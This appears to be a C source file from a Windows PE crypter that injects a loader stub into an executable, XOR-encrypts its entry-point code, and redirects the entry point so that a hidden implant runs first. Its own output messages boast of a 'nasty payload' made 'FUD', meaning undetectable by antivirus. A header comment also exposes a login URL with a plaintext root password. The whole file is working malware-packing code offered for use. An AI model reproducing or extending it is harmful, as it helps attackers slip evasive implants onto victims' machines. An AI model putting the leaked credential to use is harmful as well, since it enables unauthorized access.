
// https://msdn.microsoft.com/en-us/library/ms809762.aspx
// https://10.200.0.11/ui/#/login  root:Hummer01

#include <defines.h>

handler_t pe_handler;
extern void *win32_exe_image;

void oread(FILE *file, long offset, void *restrict buffer, size_t size)
{
    fseek(file, offset, SEEK_SET);
    if(fread(buffer, size, 1, file) != 1)
        file_error(READ);
    fflush(file);
    return;
}

void owrite(FILE *file, long offset, void *restrict buffer, size_t size)
{
    fseek(file, offset, SEEK_SET);
    if(fwrite(buffer, size, 1, file) != 1)
        file_error(WRITE);
    fflush(file);
    return;
}

bool is_pe(struct arguments arguments)
{
    FILE *fp;
    char magic[3];
    bzero(magic, sizeof(magic));
    if ((fp = fopen(arguments.binary_file, "rb")) == NULL)
        file_error(OPEN);
    
    oread(fp, 0, magic, 2);
    if(strcmp(magic, "MZ") == 0)
    {
        PIMAGE_DOS_HEADER dos_header = malloc(sizeof(IMAGE_DOS_HEADER));
        PIMAGE_NT_HEADERS nt_headers = malloc(sizeof(IMAGE_NT_HEADERS));
        oread(fp, 0, dos_header, sizeof(IMAGE_DOS_HEADER));
        oread(fp, dos_header->e_lfanew, nt_headers, sizeof(IMAGE_NT_HEADERS));
        if(nt_headers->Signature == IMAGE_NT_SIGNATURE)
        {
            if(! arguments.silent)
                printf("PE File Detected\n");
            pimage_t image;
            switch(nt_headers->FileHeader.Machine)
            {
                case 0x14c:
                    pe_handler.image = (pimage_t) &win32_exe_image;
                break;
                default:
                    printf("Unsupported architecture\n");
                    fclose(fp);
                    free(dos_header);
                    free(nt_headers);
                    return false;
            }
            fclose(fp);
            free(dos_header);
            free(nt_headers);
            return true;
        }
        else
        {
            fclose(fp);
            free(dos_header);
            free(nt_headers);
            return false;
        }
    }
    else
    {
        fclose(fp);
        return false;
    }
}

void print_header_status(PIMAGE_FILE_HEADER file_header, PIMAGE_OPTIONAL_HEADER optional_header, PIMAGE_SECTION_HEADER section_header)
{
    
    printf(
        "\nFile Header\n"
        "\tMachine: %08x\n"
        "\tNumber of sections: %i\n"
        "\tCharacteristics: %08x\n"
        "\nOptional Header\n"
        "\tAddress Of Entry Point: 0x%08x\n"
        "\tImage Base: 0x%08x\n"
        "\tSection Alignment: %i\n"
        "\tFile Alignment: %i\n"
        "\tMajor Subsystem Version: %i\n"
        "\tSize Of Image: %i\n"
        "\tDll Characteristics: %08x\n"
        "\tLoader Flags: %08x\n"
        "\nData Directory\n"
        "\tImport symbols Virtual Address: 0x%08x\n"
        "\tImport symbols Size: %i\n"
        "\tBound Import Directory Virtual Address: 0x%08x\n"
        "\tBound Import Directory Size: %i\n",
            file_header->Machine,
            file_header->NumberOfSections,
            file_header->Characteristics,
            optional_header->AddressOfEntryPoint,
            optional_header->ImageBase,
            optional_header->SectionAlignment,
            optional_header->FileAlignment,
            optional_header->MajorSubsystemVersion,
            optional_header->SizeOfImage,
            optional_header->DllCharacteristics,
            optional_header->LoaderFlags,
            optional_header->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress,
            optional_header->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size,
            optional_header->DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].VirtualAddress,
            optional_header->DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].Size
    );
    
    
    printf("\nSection Header\n");
    for(int i = 0;i < file_header->NumberOfSections;i++)
    {
        printf(
            "\t%s\n"
            "\t\tVirtual Size: %i\n"
            "\t\tVirtual Address: 0x%08x\n"
            "\t\tSize Of Raw Data: %i\n"
            "\t\tOffset in file: %i\n"
            "\t\tPointer to relocations: %08x\n"
            "\t\tPointer to line numbers: %08x\n"
            "\t\tNumber of relocations: %i\n"
            "\t\tNumber of line numbers: %i\n"
            "\t\tCharacteristics: 0x%08x\n",
                section_header[i].Name,
                section_header[i].Misc.VirtualSize,
                section_header[i].VirtualAddress,
                section_header[i].SizeOfRawData,
                section_header[i].PointerToRawData,
                section_header[i].PointerToRelocations,
                section_header[i].PointerToLinenumbers,
                section_header[i].NumberOfRelocations,
                section_header[i].NumberOfLinenumbers,
                section_header[i].Characteristics
        );
    }
    return;
}

PIMAGE_SECTION_HEADER return_section_w_highest_virtual_address(PIMAGE_SECTION_HEADER section_header, size_t section_header_size)
{
    PIMAGE_SECTION_HEADER largest = section_header;
    for(int i = 1;i < section_header_size;i++)
        if(largest->VirtualAddress < section_header[i].VirtualAddress)
            largest = (section_header+i);
    return largest;
}

void read_pe_file(char *file_name, ppefile_t pe_file)
{
    if ((pe_file->file = fopen(file_name, "rb")) == NULL)
        file_error(OPEN);
    pe_file->dos_header = malloc(sizeof(IMAGE_DOS_HEADER));
    pe_file->nt_headers = malloc(sizeof(IMAGE_NT_HEADERS));
    
    // Read in headers
    oread(pe_file->file, 0, pe_file->dos_header, sizeof(IMAGE_DOS_HEADER));
    pe_file->dos_stub = malloc(pe_file->dos_header->e_lfanew - sizeof(IMAGE_DOS_HEADER));
    oread(pe_file->file, sizeof(IMAGE_DOS_HEADER), pe_file->dos_stub, pe_file->dos_header->e_lfanew - sizeof(IMAGE_DOS_HEADER));
    
    oread(pe_file->file, pe_file->dos_header->e_lfanew, pe_file->nt_headers, sizeof(IMAGE_NT_HEADERS));
    pe_file->file_header = &(pe_file->nt_headers->FileHeader);
    pe_file->optional_header = &(pe_file->nt_headers->OptionalHeader);
    
    pe_file->section_header_size = IMAGE_SIZEOF_SECTION_HEADER * pe_file->file_header->NumberOfSections;
    pe_file->section_header = malloc(pe_file->section_header_size + IMAGE_SIZEOF_SECTION_HEADER);
    oread(pe_file->file, pe_file->dos_header->e_lfanew + sizeof(IMAGE_NT_HEADERS), pe_file->section_header, pe_file->section_header_size + IMAGE_SIZEOF_SECTION_HEADER);
}

void free_pe_file(ppefile_t pe_file)
{
    fclose(pe_file->file);
    free(pe_file->dos_header);
    free(pe_file->dos_stub);
    free(pe_file->nt_headers);
    free(pe_file->section_header);
}

bool inject_pe(struct arguments arguments)
{
    FILE *fwp;
    pe_file_t pe_in;
    DWORD crypt_key = 0;
    
    if(! arguments.silent)
        printf("Loading Information For Injection.\n");
    
    if ((fwp = fopen(arguments.output_file, "wb")) == NULL)
        file_error(OPEN);
    
    read_pe_file(arguments.binary_file, &pe_in);
    
    // print out important information pre-implant
    if(!arguments.silent && arguments.verbose)
        print_header_status(pe_in.file_header, pe_in.optional_header, pe_in.section_header);
    
    if(! arguments.silent)
        printf("Performing implant.\n");
    
    // store old entry point
    pe_handler.image->entry_point = pe_in.optional_header->ImageBase + pe_in.optional_header->AddressOfEntryPoint;
    pe_handler.image->flags = FLAGS_BRUTEFORCE;
    
    // generate key and encrypt the canary
    srand(time(NULL));
    crypt_key = (DWORD) rand() % 0xFFFFFFFF;
    pe_handler.image->canary ^= crypt_key;

////////////////////////////////////////////////////////////////////////////////
    pcrypt_data_t crypt_sections;
    crypt_sections = malloc(pe_in.file_header->NumberOfSections * sizeof(crypt_data_t));
    bzero(crypt_sections, pe_in.file_header->NumberOfSections * sizeof(crypt_data_t));
    DWORD *data;
    
    // if there is not enough space in virtual memory
    if(pe_in.section_header[1].VirtualAddress - (pe_in.section_header[0].VirtualAddress + pe_in.section_header[0].Misc.VirtualSize + pe_handler.image->size + pe_in.file_header->NumberOfSections * sizeof(crypt_data_t)) < 0)
    {
        puts("Boo, not enough gap in virtual memory, we're SUD, i dont want to do this yet");
        exit(-1);
    }
    else
    {
        puts("Injecting our nasty payload FUD style :D");
        // if there is already enough space in the section
        if(pe_in.section_header[0].SizeOfRawData > pe_in.section_header[0].Misc.VirtualSize + pe_handler.image->size + pe_in.file_header->NumberOfSections * sizeof(crypt_data_t))
        {
            // set up loader for implant
            pe_handler.image->loader_address = pe_in.optional_header->ImageBase + pe_in.section_header[0].VirtualAddress + pe_in.section_header[0].Misc.VirtualSize;
            // write out original data
            data = malloc(pe_in.section_header[0].SizeOfRawData);
            oread(pe_in.file, pe_in.section_header[0].PointerToRawData, data, pe_in.section_header[0].SizeOfRawData);
            owrite(fwp, pe_in.section_header[0].PointerToRawData, data, pe_in.section_header[0].SizeOfRawData);
            free(data);
            
            // CRYPT THAT SHIIIIIIIIT
            #define ENTRYPOINT_DELTA ( (pe_handler.image->entry_point - pe_in.optional_header->ImageBase) - pe_in.section_header[0].VirtualAddress )
            #define FILE_OFFSET ( ENTRYPOINT_DELTA + pe_in.section_header[0].PointerToRawData)
            
            #define DIFFERENCE ( pe_in.section_header[0].Misc.VirtualSize - ENTRYPOINT_DELTA )
            #define CODE_SIZE ( DIFFERENCE - (DIFFERENCE % sizeof(DWORD)) )
            
            // crypt data
            data = malloc(CODE_SIZE);
            oread(pe_in.file, FILE_OFFSET, data, CODE_SIZE);
            for(int i = 0;i < CODE_SIZE / sizeof(DWORD);i++)
                data[i] ^= crypt_key;
            owrite(fwp, FILE_OFFSET, data, CODE_SIZE);
            crypt_sections[0].VirtualAddress = pe_handler.image->entry_point;
            crypt_sections[0].Size = CODE_SIZE;
            
            
            // write out loader and crypt_sections
            owrite(fwp, pe_in.section_header[0].PointerToRawData + pe_in.section_header[0].Misc.VirtualSize, pe_handler.image, pe_handler.image->size);
            owrite(fwp, pe_in.section_header[0].PointerToRawData + pe_in.section_header[0].Misc.VirtualSize + pe_handler.image->size, crypt_sections, pe_in.file_header->NumberOfSections * sizeof(crypt_data_t));
            free(crypt_sections);
            
            printf("file offset of loader: %i\n",  pe_in.section_header[0].Misc.VirtualSize + pe_in.section_header[0].PointerToRawData);
            
            // set up new entry point, virtual size, and permissions
            pe_in.optional_header->AddressOfEntryPoint = pe_in.section_header[0].VirtualAddress + pe_in.section_header[0].Misc.VirtualSize + offsetof(image_t, loader);
            pe_in.section_header[0].Misc.VirtualSize += pe_handler.image->size;
            pe_in.section_header[0].Characteristics |= IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ;
            // write out remaining sections
            for(int i = 1, s = 0;i < pe_in.file_header->NumberOfSections;i++)
            {
                if(pe_in.section_header[i].SizeOfRawData > 0)
                {
                    data = malloc(pe_in.section_header[i].SizeOfRawData);
                    oread(pe_in.file, pe_in.section_header[i].PointerToRawData, data, pe_in.section_header[i].SizeOfRawData);
                    owrite(fwp, pe_in.section_header[i].PointerToRawData, data, pe_in.section_header[i].SizeOfRawData);
                    free(data);
                }
            }
        }
        else
        {
            puts("need to resize and change offsets, I dont want to do this yet");
            exit(-1);
        }
    }
////////////////////////////////////////////////////////////////////////////////

    // write out new headers
    owrite(fwp, 0, pe_in.dos_header, sizeof(IMAGE_DOS_HEADER));
    owrite(fwp, sizeof(IMAGE_DOS_HEADER), pe_in.dos_stub, pe_in.dos_header->e_lfanew - sizeof(IMAGE_DOS_HEADER));
    owrite(fwp, pe_in.dos_header->e_lfanew, pe_in.nt_headers, sizeof(IMAGE_NT_HEADERS));
    owrite(fwp, pe_in.dos_header->e_lfanew + sizeof(IMAGE_NT_HEADERS), pe_in.section_header, pe_in.section_header_size);

    // display new PE info
    if(!arguments.silent && arguments.verbose)
        print_header_status(pe_in.file_header, pe_in.optional_header, pe_in.section_header);
    
    
    if(! arguments.silent)
        printf(
            "\nLoader image\n"
            "\tLoader Size: %i\n"
            "\tEntry Point: 0x%08x\n"
            "\tFlags: 0x%08x\n"
            "\tCanary: 0x%08x\n"
            "\tCrypted canary: 0x%08x\n"
            "\tSize: %i\n\n",
                pe_handler.image->loader_size,
                pe_handler.image->entry_point,
                pe_handler.image->flags,
                pe_handler.image->canary ^ crypt_key,
                pe_handler.image->canary,
                pe_handler.image->size
        );
    
    if(!arguments.silent)
        printf("Key: %08x\nNew entry point: %08x\nOld entry point: %08x\n", crypt_key, pe_in.optional_header->AddressOfEntryPoint + pe_in.optional_header->ImageBase, pe_handler.image->entry_point);

    
    fclose(fwp);
    free_pe_file(&pe_in);
    return true;
}

void __attribute__((constructor)) pe_constructor(void)
{
    pe_handler.image = win32_exe_image;
    pe_handler.is_type = (void*) is_pe;
    pe_handler.inject = (void*) inject_pe;
    
    handlers[__COUNTER__] = pe_handler;
}

